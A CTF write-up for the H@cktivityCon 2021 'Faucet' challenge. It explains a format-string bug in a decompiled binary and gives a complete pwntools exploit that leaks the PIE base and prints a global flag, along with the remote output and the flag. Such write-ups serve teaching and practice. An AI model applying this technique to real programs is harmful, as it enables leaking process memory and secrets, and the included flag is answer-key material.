# H@cktivityCon 2021 CTF

## Faucet


> My faucet has a little leak. I really should get it fixed before it causes any damage... 
> 
> 413
> 
> [`faucet`](faucet)
>
> author: @M_alpha#3534

Tags: _pwn_ _x86-64_ _format-string_


## Summary

Basic _print arbitrary string_ with a format-string attack.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Finally, all mitigations in place.

> BTW, this is the _default_ behavior of `gcc`.

But don't panic because this is a format-string challenge.  Format-string attacks, IMHO, are the most powerful exploits because you can read and/or write any location (assuming the location is readable and/or writable).
    

### Decompile with Ghidra

```c
void buy_item(void)
{
  int iVar1;
  size_t sVar2;
  long in_FS_OFFSET;
  char local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("What item would you like to buy?: ");
  fgets(local_38,0x20,stdin);
  sVar2 = strcspn(local_38,"\n");
  local_38[sVar2] = '\0';
  iVar1 = strcmp(local_38,"hammer");
  if (iVar1 == 0) {
    hammer = 1;
  }
  else {
    iVar1 = strcmp(local_38,"wrench");
    if (iVar1 == 0) {
      wrench = 1;
    }
  }
  printf("You have bought a ");
  printf(local_38);
  puts("\n");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}
```

The `printf(local_38);` vuln is in `buy_item` function, however our attack is limited to `0x20` (32) bytes since that is all `fgets` reads in (31 actually since `fgets` will null terminal the final byte).  But, we can buy as many items as we like.

This challenge would have been more fun if that was it, however in `main`:

```
undefined8 main(void)
{
  undefined4 uVar1;
  FILE *__stream;
  
  __stream = fopen("flag.txt","r");
  if (__stream != (FILE *)0x0) {
    fgets(FLAG,0x100,__stream);
```    

the flag is read into the global variable `FLAG`.

> Just double-click on `FLAG` in Ghidra to see that it is a global.

To print the flag we need to first leak the base process address (PIE is enabled), then we can use that to compute the location of `FLAG` and then `printf` it.

> If you're new to format-string exploits then read [dead-canary](https://github.com/datajerk/ctf-write-ups/tree/master/redpwnctf2020/dead-canary) for some examples as well as [Exploiting Format String Vulnerabilities](https://cs155.stanford.edu/papers/formatstring-1.2.pdf) and [https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf](https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf).


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./faucet')

if args.REMOTE:
    p = remote('challenge.ctf.games', 31230)
else:
    p = process(binary.path)

# get base address
p.recvuntil(b'[5]')
p.sendlineafter(b'> ',b'5')
p.sendlineafter(b': ',b'%10$p')
p.recvuntil(b'You have bought a ')
_start = int(p.recvline().strip(),16)
binary.address = _start - binary.sym._start
log.info('binary.address: ' + hex(binary.address))

# get flag
p.recvuntil(b'[5]')
p.sendlineafter(b'> ',b'5')
p.sendlineafter(b': ',b'%00007$s' + p64(binary.sym.FLAG))
p.recvuntil(b'You have bought a ')
log.info('flag: ' + p.recvline().strip().decode())
p.close()
```

The first pass sends the format-string `%10$p`; this will leak the location of `_start` from the stack:

```
0x00007fffffffe310│+0x0000: 0x0000000068616c62 ("blah"?)	 ← $rsp, $rdi
0x00007fffffffe318│+0x0008: 0x00007ffff7e4771a  →  <puts+378> cmp eax, 0xffffffff
0x00007fffffffe320│+0x0010: 0x0000555555555740  →  <__libc_csu_init+0> endbr64
0x00007fffffffe328│+0x0018: 0x00007fffffffe360  →  0x0000000000000000
0x00007fffffffe330│+0x0020: 0x00005555555551e0  →  <_start+0> endbr64
```

> To get this stack view set a break point at the offending `printf` (i.e. `b *buy_item+183`).
>
> I'm not going to cover how to determine the offset, the links I provided above as well as many of my write ups (see [INDEX.md](https://github.com/datajerk/ctf-write-ups/blob/master/INDEX.md)) cover this in detail.

The offset is `6` (it's almost always `6` with easy CTF challenges), so counting down to `_start` we end up with `10` as the parameter to pass to `%p` to leak a base address.

With the location of `_start`, we can compute the location of the binary address.

The second pass sends the format-string `%00007$s` with the location of `FLAG` to print the flag.  The padding is required to keep the stack aligned (8 bytes for the format string followed by 8 bytes for the location of of `FLAG`).  `7` because the offset is `6`, the format string is at parameter (offset) `6` and the parameter is next at offset `7`, hence `%00007$s`.

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/hacktivityctf2021/faucet/faucet'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to challenge.ctf.games on port 31230: Done
[*] binary.address: 0x563124cde000
[*] flag: flag{6bc75f21f8839ce0db898a1950d11ccf}
```
